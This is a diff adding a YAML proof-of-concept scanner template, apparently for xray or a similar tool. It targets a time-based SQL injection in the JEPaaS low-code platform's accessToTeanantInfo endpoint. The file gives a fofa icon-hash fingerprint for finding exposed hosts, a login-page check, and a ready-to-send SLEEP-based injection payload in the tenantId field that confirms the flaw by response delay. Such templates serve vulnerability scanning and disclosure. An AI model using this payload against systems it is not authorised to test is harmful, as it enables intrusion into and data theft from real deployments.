@@ -1,0 +1,23 @@
+id: poc-yaml-jepaas-accesstoteanantinfo-sqli
+info:
+  name: JEPaaS低代码平台 accessToTeanantInfo SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: jepaas低代码平台
+  fofa: icon_hash="-999810473"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /login.html
+  expression: status_code == 200 && contains(title,"JEPaaS云平台")
+- method: POST
+  path: /rbac/im/accessToTeanantInfo
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: tenantId=1' AND (SELECT 2805 FROM (SELECT(SLEEP({{.t1}})))moYz)-- sBPi
+  expression: "status_code == 200 && \ncontains(body,`{\"totalCount\":0,\"rows\":[]}`)\
+    \ &&\nduration > t1 &&\nduration < t2\n"
+transport: http
